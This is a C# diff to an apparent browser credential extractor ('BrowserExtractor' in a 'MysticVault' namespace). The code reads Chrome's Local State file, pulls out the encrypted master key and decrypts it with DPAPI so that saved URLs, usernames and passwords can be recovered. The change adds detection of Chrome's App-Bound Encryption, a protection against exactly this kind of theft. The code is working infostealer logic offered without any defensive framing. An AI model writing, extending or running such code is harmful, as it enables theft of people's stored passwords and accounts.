@@ -7,6 +7,10 @@ using System.Text;
 using System.Text.Json;
 using Microsoft.Data.Sqlite;
 namespace MysticVault;
+public class AppBoundEncryptionException : Exception
+{
+    public AppBoundEncryptionException(string message) : base(message) { }
+}
 public record ExtractedCredential(string Url, string Username, string Password);
 public class BrowserExtractor
 {
@@ -96,22 +100,21 @@ public class BrowserExtractor
     }
     private static byte[]? GetMasterKey(string localStatePath)
     {
-        try
+        string content = File.ReadAllText(localStatePath);
+        using var document = JsonDocument.Parse(content);
+        if (document.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
+            osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
         {
-            string content = File.ReadAllText(localStatePath);
-            using var document = JsonDocument.Parse(content);
-            if (document.RootElement.TryGetProperty("os_crypt", out var osCrypt) &&
-                osCrypt.TryGetProperty("encrypted_key", out var encryptedKeyElement))
+            string encryptedKeyB64 = encryptedKeyElement.GetString() ?? "";
+            byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKeyB64);
+            string prefix = Encoding.ASCII.GetString(encryptedKeyBytes, 0, 4);
+            if (prefix == "APPB")
             {
-                string encryptedKeyB64 = encryptedKeyElement.GetString() ?? "";
-                byte[] encryptedKeyBytes = Convert.FromBase64String(encryptedKeyB64);
-                byte[] dpapiEncryptedKey = new byte[encryptedKeyBytes.Length - 5];
-                Array.Copy(encryptedKeyBytes, 5, dpapiEncryptedKey, 0, dpapiEncryptedKey.Length);
-                return ProtectedData.Unprotect(dpapiEncryptedKey, null, DataProtectionScope.CurrentUser);
+                throw new AppBoundEncryptionException("Chrome v127+ App-Bound Encryption detected.");
             }
-        }
-        catch
-        {
+            byte[] dpapiEncryptedKey = new byte[encryptedKeyBytes.Length - 5];
+            Array.Copy(encryptedKeyBytes, 5, dpapiEncryptedKey, 0, dpapiEncryptedKey.Length);
+            return ProtectedData.Unprotect(dpapiEncryptedKey, null, DataProtectionScope.CurrentUser);
         }
         return null;
     }
